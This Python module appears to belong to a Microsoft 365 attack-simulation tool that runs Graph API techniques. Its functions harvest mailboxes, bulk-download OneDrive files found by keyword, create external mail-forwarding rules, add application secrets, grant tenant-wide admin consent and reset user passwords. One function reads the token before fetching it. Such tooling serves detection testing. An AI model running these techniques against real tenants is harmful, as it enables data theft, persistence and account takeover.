import requests
import logging
import datetime
import os
from src.auth import get_ms_token, get_new_token_with_refresh_token

### Graph

graph_scope = "https://graph.microsoft.com/.default"

def read_email_graph(auth_config, params, token=False):

    logging.info("Running the read_email technique using the Graph API")

    if not token:
        token = get_ms_token(auth_config, params['auth_method'], graph_scope)

    mailbox = params['mailbox']
    graph_endpoint = f'https://graph.microsoft.com/v1.0/users/{mailbox}/mailFolders/Inbox/messages'


    access_token = token['access_token']
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json'
    }

    short_endpoint = graph_endpoint.replace("https://graph.microsoft.com","")
    #logging.info(f"Submitting GET request to v1.0/users/me/mailFolders/Inbox/messages")
    logging.info(f"Submitting GET request to {short_endpoint}")
    response = requests.get(graph_endpoint, headers=headers)

    if response.status_code == 200:
        logging.info("200 OK")
        messages = response.json().get('value', [])
        for message in messages[:params['limit']]:
            #print(message.get('subject'), message.get('from'))
            #body_content = message.get('body', {}).get('content', '')
            logging.info(f"Read email with subject: {message.get('subject')}")
            #print("Body:", body_content)

    else:
        logging.error(f"Operation failed with status code {response.status_code }")
        #print (response.json())


def search_email_graph(auth_config, params, token=False):

    logging.info("Running the search_email technique using the Graph API")

    if not token:
        token = get_ms_token(auth_config, params['auth_method'], graph_scope)

    graph_endpoint = f'https://graph.microsoft.com/v1.0/search/query'

    access_token = token['access_token']
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json'
    }

    keyword = params['keyword']
    limit = params ['limit']

    data = {
        "requests": [
            {
            "entityTypes": [
                "message"
            ],
            "query": {
                "queryString": keyword
            },
            "from": 0,
            "size": limit
            }
        ]
    }

    short_endpoint = graph_endpoint.replace("https://graph.microsoft.com","")
    logging.info(f"Submitting POST request to {short_endpoint}")
    response = requests.post(graph_endpoint, headers=headers, json=data)

    hits_found = False

    if response.status_code == 200:
        logging.info("200 OK")
        values = response.json().get('value', [])
        for value in values:
            for hitsContainer in value.get("hitsContainers", []):
                for hit in hitsContainer.get("hits", []):
                    hits_found = True
                    subject = hit["resource"]["subject"]
                    logging.info(f"Found email with subject: {subject}")
        #print (hits[0])
        #print (response.text)

        if not hits_found:
            logging.info("Request returned 0 results.")
    else:
        logging.error(f"Operation failed with status code {response.status_code }")
        print (response.text)



def search_onedrive_graph(auth_config, params, token=False):

    logging.info("Running the search_onedrive technique using the Graph API")

    if not token:
        token = get_ms_token(auth_config, params['auth_method'], graph_scope)

    graph_endpoint = f'https://graph.microsoft.com/v1.0/search/query'
    access_token = token['access_token']
    #print(access_token)

    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json'
    }

    keyword = params['keyword']
    limit = params ['limit']

    data = {
        "requests": [
            {
            "entityTypes": [
                "driveItem"
            ],
            "query": {
                "queryString": keyword
            },
            "from": 0,
            "size": limit
            }
        ]
    }

    short_endpoint = graph_endpoint.replace("https://graph.microsoft.com","")
    logging.info(f"Submitting POST request to {short_endpoint}")
    response = requests.post(graph_endpoint, headers=headers, json=data)

    hits_found = False


    if response.status_code == 200:
        logging.info("200 OK")
        #print (response.text)
        values = response.json().get('value', [])
        for value in values:
            for hitsContainer in value.get("hitsContainers", []):
                for hit in hitsContainer.get("hits", []):
                    #print (hit['resource'].keys())
                    hits_found = True
                    name = hit['resource']['name']
                    created = hit['resource']['createdDateTime']
                    item_id = hit['resource'].get('id')  # Get the ID for downloading
                    logging.info(f"Found file name: {name} created at {created}")
                    
                                        # Download the file
                    download_path = f"./downloads/{name}"  # Define where to save the downloaded file
                    download_params = {'item_id': item_id}
                    
                    logging.info(f"Initiating download for file: {name}")
                    download_onedrive_file(auth_config, download_params, download_path, token=token)

        if not hits_found:
            logging.info("Requested returned 0 results.")
        #print (hits[0])
        #print (response.text)


    else:
        logging.error(f"Operation failed with status code {response.status_code }")
        print (response.text)


def create_rule_graph(auth_config, params, token=False):

    logging.info("Running the create_rule technique using the Graph API")

    #graph_scope = "https://graph.microsoft.com/MailboxSettings.ReadWrite"
    #graph_scope = "MailboxSettings.ReadWrite"

    #https://learn.microsoft.com/en-us/graph/api/resources/messageruleactions?view=graph-rest-1.0
    mailbox = params['mailbox']
    rule_name = params['rule_name']
    forward_to = params ['forward_to']
    body_contains = params ['body_contains']

    #graph_endpoint = f'https://graph.microsoft.com/v1.0/users/{mailbox}/mailFolders/Inbox/messageRules'
    #graph_endpoint = f'https://graph.microsoft.com/v1.0/users/me/mailFolders/Inbox/messageRules'    
    graph_endpoint = f'https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules'    
    access_token = token['access_token']
    
    #print(access_token)

    if not token:
        token = get_ms_token(auth_config, params['auth_method'], graph_scope)

    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json'
    }

    data = {
        "displayName": rule_name,
        "sequence": 1,
        "isEnabled": True,
        "conditions": {
            "bodyContains": [
            body_contains 
            ]
        },
        "actions": {
            "forwardTo": [
            {
                "emailAddress": {
                    "address": forward_to 
                }
            }
            ],
            "stopProcessingRules": True
        }
    }
    
    short_endpoint = graph_endpoint.replace("https://graph.microsoft.com","")
    logging.info(f"Submitting POST request to {short_endpoint}")
    response = requests.post(graph_endpoint, headers=headers, json=data)

    if response.status_code == 201:
        logging.info("201 - Created")
    else:
        logging.error(f"Operation failed with status code {response.status_code }")
        print (response.json())    
        

def add_application_secret_graph(auth_config, params, token=False):

    logging.info("Running the add_secret technique using the Graph API")

    if not token:
        token = get_ms_token(auth_config, params['auth_method'], graph_scope)

    app_object_id = params['app_id']
    #secret_description = params['description']
    secret_description = params.get('description', 'Simulation Secret')
    secret_duration = params.get('secret_duration', 90)  # Duration in days
    end_date = (datetime.datetime.utcnow() + datetime.timedelta(days=secret_duration)).isoformat() + "Z"
    
    graph_endpoint = f'https://graph.microsoft.com/v1.0/applications/{app_object_id}/addPassword'

    access_token = token['access_token']
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json'
    }

    data = {
        "passwordCredential": {
            "displayName": secret_description,
            "endDateTime": end_date
        }
    }

    short_endpoint = graph_endpoint.replace("https://graph.microsoft.com", "")
    logging.info(f"Submitting POST request to {short_endpoint}")
    response = requests.post(graph_endpoint, headers=headers, json=data)

    if response.status_code == 200:
        logging.info("200 OK - Secret added successfully")
        secret_id = response.json().get('keyId')
        logging.info(f"Added secret with ID: {secret_id}")
    else:
        logging.error(f"Operation failed with status code {response.status_code}")
        print(response.text)


def add_service_principal(auth_config, params, token=False):

    logging.info("Running the add_service_principal technique using the Graph API")

    if not token:
        token = get_ms_token(auth_config, params['auth_method'], graph_scope)

    app_id = params['app_id']  # The App ID (client ID) of the external multi-tenant app
    graph_endpoint = 'https://graph.microsoft.com/v1.0/servicePrincipals'

    access_token = token['access_token']
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json'
    }

    data = {
        "appId": app_id
    }

    short_endpoint = graph_endpoint.replace("https://graph.microsoft.com", "")
    logging.info(f"Submitting POST request to {short_endpoint}")
    response = requests.post(graph_endpoint, headers=headers, json=data)

    if response.status_code == 201:
        logging.info("201 Created - Service principal for external app added successfully")
        #print (response.json())
        service_principal_id = response.json().get('id')
        logging.info(f"Service principal ID: {service_principal_id}")
    else:
        logging.error(f"Operation failed with status code {response.status_code}")
        print(response.text)


def admin_consent_graph(auth_config, params, token=False):

    logging.info("Running the admin_consent technique using the Graph API")

    if not token:
        token = get_ms_token(auth_config, params['auth_method'], graph_scope)

    client_id = params['client_id']  # The ID of the external multi-tenant app
    tenant_id = auth_config['tenant_id']  # Your tenant ID
    resource_id = params['resource_id']
    consent_permissions = params['permissions']  # List of permissions to consent to

    graph_endpoint = f'https://graph.microsoft.com/v1.0/{tenant_id}/oauth2PermissionGrants'

    access_token = token['access_token']
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json'
    }

    data = {
        "clientId": client_id,
        "consentType": "AllPrincipals",
        "principalId": None,
        "resourceId": resource_id,  # The service principal ID of the app being consented to
        "scope": " ".join(consent_permissions)
    }

    short_endpoint = graph_endpoint.replace("https://graph.microsoft.com", "")
    logging.info(f"Submitting POST request to {short_endpoint}")
    response = requests.post(graph_endpoint, headers=headers, json=data)

    if response.status_code == 201:
        print (response.json())
        logging.info("201 Created - Admin consent granted successfully")
    else:
        logging.error(f"Operation failed with status code {response.status_code}")
        print(response.text)


def create_application_registration(auth_config, params, token=False):
    logging.info("Running the create_application_registration technique using the Graph API")

    if not token:
        token = get_ms_token(auth_config, params['auth_method'], graph_scope)

    app_name = params['app_name']  
    redirect_uris = params.get('redirect_uris', []) 
    sign_in_audience = params.get('sign_in_audience', 'AzureADMyOrg')

    graph_endpoint = 'https://graph.microsoft.com/v1.0/applications'

    access_token = token['access_token']
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json'
    }

    data = {
        "displayName": app_name,
        "signInAudience": sign_in_audience,
        "web": {
            "redirectUris": redirect_uris
        }
    }

    short_endpoint = graph_endpoint.replace("https://graph.microsoft.com", "")
    logging.info(f"Submitting POST request to {short_endpoint}")
    response = requests.post(graph_endpoint, headers=headers, json=data)

    if response.status_code == 201:
        logging.info("201 Created - Application registration created successfully")
        app_id = response.json().get('appId')
        logging.info(f"New application App ID: {app_id}")
        return response.json()
    else:
        logging.error(f"Operation failed with status code {response.status_code}")
        print(response.text)        


def download_onedrive_file(auth_config, params, save_path, token=False):
    
    logging.info("Running the download_onedrive_file technique using the Graph API")

    if not token:
        token = get_ms_token(auth_config, params['auth_method'], graph_scope)

    download_dir = os.path.dirname(save_path)
    if not os.path.exists(download_dir):
        os.makedirs(download_dir)
        logging.info(f"Created directory: {download_dir}")

    #user_id = params.get('user_id', 'me')  # Defaults to the current authenticated user
    user_id = params.get('user_id')

    if not user_id:  # If user_id is not provided, get it for the authenticated user
        user_id = get_authenticated_user_id(auth_config, token=token)
        if not user_id:
            logging.error("Authenticated User ID not found; aborting download.")
            return

    item_id = params['item_id']  # The unique ID of the file to download

    graph_endpoint = f'https://graph.microsoft.com/v1.0/users/{user_id}/drive/items/{item_id}/content'

    access_token = token['access_token']
    headers = {
        'Authorization': f'Bearer {access_token}'
    }

    short_endpoint = graph_endpoint.replace("https://graph.microsoft.com", "")
    logging.info(f"Submitting GET request to {short_endpoint}")
    response = requests.get(graph_endpoint, headers=headers, stream=True)

    if response.status_code == 200:
        logging.info("200 OK - File downloaded successfully")
        
        with open(save_path, 'wb') as file:
            for chunk in response.iter_content(chunk_size=1024):
                file.write(chunk)
        
        logging.info(f"File saved to {save_path}")
    else:
        logging.error(f"Operation failed with status code {response.status_code}")
        print(response.text)
        
def get_authenticated_user_id(auth_config, token=False):
    
    if not token:
        token = get_ms_token(auth_config, 'authorization_code', 'https://graph.microsoft.com/.default')

    graph_endpoint = 'https://graph.microsoft.com/v1.0/me'

    access_token = token['access_token']
    headers = {
        'Authorization': f'Bearer {access_token}'
    }

    response = requests.get(graph_endpoint, headers=headers)

    if response.status_code == 200:
        user_id = response.json().get('id')
        logging.info(f"Authenticated User ID is {user_id}")
        return user_id
    else:
        logging.error(f"Failed to retrieve authenticated user ID with status code {response.status_code}")
        print(response.text)
        return None        
    

def send_email_graph(auth_config, params, token=False):

    logging.info("Running the send_email technique using the Graph API")

    if not token:
        token = get_ms_token(auth_config, params['auth_method'], graph_scope)
        
    
    access_token = token['access_token']
    refresh_token = token['refresh_token']    
        
    #user_id = params ['user_id']        
    subject = params ['subject']
    body_content = params ['body']
    recipients = params ['recipients']

    to_recipients = [{"emailAddress": {"address": email}} for email in recipients]

    headers = {
        "Authorization": f"Bearer {access_token}",
        "Content-Type": "application/json"
    }

    #url = f"https://graph.microsoft.com/v1.0/users/{user_id}/sendMail"
    graph_endpoint = f"https://graph.microsoft.com/v1.0/me/sendMail"

    payload = {
        "message": {
            "subject": subject,
            "body": {
                "contentType": "HTML",
                "content": body_content
            },
            "toRecipients": to_recipients
        },
        "saveToSentItems": "true"  
    }
    #print(payload)
    short_endpoint = graph_endpoint.replace("https://graph.microsoft.com", "")
    logging.info(f"Submitting GET request to {short_endpoint}")

    response = requests.post(graph_endpoint, headers=headers, json=payload)

    if response.status_code == 202:
        logging.info("202 Accepted - Email sent successfully!")
        #return {"message": "Email sent successfully"}
    else:
        logging.error(f"Failed to send emails with status code {response.status_code}")
        #print (response.json())
        #return response.json()  
        
    #new_token = get_new_token_with_refresh_token(auth_config['tenant_id'], refresh_token, "https://outlook.office365.com/.default")
    #print("new_token")
    #print (new_token['access_token'])
    

def enumerate_entities(auth_config, params, entity_type=None, token=False):

    # Supported entity types and their endpoints
    endpoints = {
        'users': 'https://graph.microsoft.com/v1.0/users',
        'groups': 'https://graph.microsoft.com/v1.0/groups',
        'applications': 'https://graph.microsoft.com/v1.0/applications',
        'service_principals': 'https://graph.microsoft.com/v1.0/servicePrincipals',
        'directory_roles': 'https://graph.microsoft.com/v1.0/directoryRoles',
        'devices': 'https://graph.microsoft.com/v1.0/devices',
        'teams': 'https://graph.microsoft.com/v1.0/teams',
        'sites': 'https://graph.microsoft.com/v1.0/sites',
    }

    # If no entity_type is provided, enumerate all supported entities
    if entity_type is None:
        entity_types_to_enumerate = endpoints.keys()
    elif isinstance(entity_type, str):
        # If a single entity type is provided
        entity_types_to_enumerate = [entity_type]
    elif isinstance(entity_type, list):
        # If a list of entity types is provided
        entity_types_to_enumerate = entity_type
    else:
        logging.error("Invalid entity_type format. Must be a string, list, or None.")
        return

    if not token:
        token = get_ms_token(auth_config, params['auth_method'], graph_scope)

    access_token = token['access_token']
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json'
    }

    for entity in entity_types_to_enumerate:
        if entity not in endpoints:
            logging.error(f"Unsupported entity type: {entity}")
            continue

        logging.info(f"Running the enumerate_{entity} technique")
        graph_endpoint = endpoints[entity]
        short_endpoint = graph_endpoint.replace("https://graph.microsoft.com", "")
        logging.info(f"Submitting GET request to {short_endpoint}")

        response = requests.get(graph_endpoint, headers=headers)

        if response.status_code == 200:
            entities = response.json().get('value', [])
            logging.info(f"Enumeration successful. Found {len(entities)} {entity}.")
        else:
            logging.error(f"Failed to enumerate {entity}. Status code: {response.status_code}")
            logging.error(response.text)


def change_user_password(auth_config, params, token=False):

    logging.info(f"Running the change_password technique")
    user_id = params['user_id']
    new_password = params['new_password']

    if not token:
        token = get_ms_token(auth_config, params['auth_method'], graph_scope)

    access_token = token['access_token']
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json'
    }

    graph_endpoint = f'https://graph.microsoft.com/v1.0/users/{user_id}'
    short_endpoint = graph_endpoint.replace("https://graph.microsoft.com", "")
    logging.info(f"Submitting PATCH request to {short_endpoint}")

    # Prepare the data payload for changing the password
    data = {
        "passwordProfile": {
            "password": new_password,
            "forceChangePasswordNextSignIn": False
        }
    }

    # Send the PATCH request to update the password
    response = requests.patch(graph_endpoint, headers=headers, json=data)

    # Handle response
    if response.status_code == 204:
        logging.info(f"Password for user ID {user_id} successfully updated.")
    else:
        logging.error(f"Failed to change password for user ID {user_id}. Status code: {response.status_code}")
        logging.error(response.text)